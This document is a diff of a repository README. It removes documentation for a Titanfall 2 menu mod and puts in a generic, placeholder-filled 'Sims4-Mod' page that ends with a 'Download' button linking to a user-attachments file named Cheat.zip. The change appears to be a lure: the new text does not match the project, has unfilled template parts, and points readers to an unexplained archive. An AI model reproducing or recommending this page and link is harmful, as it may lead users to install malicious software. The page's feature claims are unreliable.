@@ -1,120 +1,64 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Sims4-Mod
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+![Sims4-Mod Banner](https://example.com/banner.jpg)
 
+Welcome to Sims4-Mod! 🎉 This repository contains a collection of awesome mods for the popular life simulation game, The Sims 4. If you're looking to enhance your Sims 4 gameplay experience, you're in the right place! 
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Table of Contents
+- [Features](#features)
+- [Installation Guide](#installation-guide)
+- [How to Contribute](#how-to-contribute)
+- [License](#license)
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+## Features
 
-## Installation
+Our Sims4-Mod repository offers a wide range of mods that cater to various aspects of The Sims 4 gameplay. Whether you're looking to add new characters, build custom content, or tweak game mechanics, we've got you covered. Here are some of the key features of our mods:
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+### Custom Characters
+Explore a variety of custom characters to add to your Sims 4 world. From celebrities to fictional characters, our collection has something for everyone.
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+### Build and Buy Mode
+Enhance your building and decorating experience with new items, objects, and tools to customize your Sims' homes.
 
-## Icepick
+### Gameplay Tweaks
+Adjust game mechanics, add new interactions, and unlock hidden features to make your gameplay more exciting and diverse.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+### Bug Fixes
+Say goodbye to pesky bugs and glitches in the game with our collection of bug-fixing mods that improve the overall stability of The Sims 4.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+![Sims4-Mod Gameplay](https://example.com/gameplay.jpg)
 
-3) Launch Icepick.
+## Installation Guide
 
-## Northstar
+To install mods from Sims4-Mod, follow these simple steps:
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+1. Download the mod files from the provided link.
+2. Extract the files from the downloaded zip folder.
+3. Place the extracted files in the appropriate mod folder in your Sims 4 directory.
+4. Enable the mod through the in-game settings menu.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+That's it! You're now ready to enjoy the new features and enhancements that our mods offer.
 
-3) Launch Northstar.
+## How to Contribute
 
-## Screenshots
+We welcome contributions from the Sims 4 modding community to help us expand our collection and improve existing mods. If you're interested in contributing, here's how you can get involved:
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+1. Fork the repository.
+2. Make your modifications or create a new mod.
+3. Submit a pull request with a detailed description of your changes.
 
-Main Menu with the original Titanfall 2 menu video
+Our team will review your contribution and work with you to incorporate it into the repository. Together, we can make Sims4-Mod even better!
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## License
 
-Main Menu with the showcase removed to declutter the menu
+This repository is licensed under the MIT license. You are free to use, modify, and distribute the mods in this repository for personal and commercial use. However, we kindly ask that you give credit to the original creators when sharing or redistributing the mods.
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+---
 
-New Cheat options that can be enabled as well as the extras menu
+Ready to take your Sims 4 gameplay to the next level? Click the button below to download the Sims4-Mods now! 
+[![Download Sims4-Mods](https://img.shields.io/badge/Download-Here-<COLOR-CODE>)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+Happy simming! 🌟
 
-Added keybinds for speedrunners and extra commands for fun
+Feel free to explore the different mods in this repository and create the Sims 4 world of your dreams. If you have any questions or suggestions, please don't hesitate to reach out. Enjoy! 🎮🏡
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
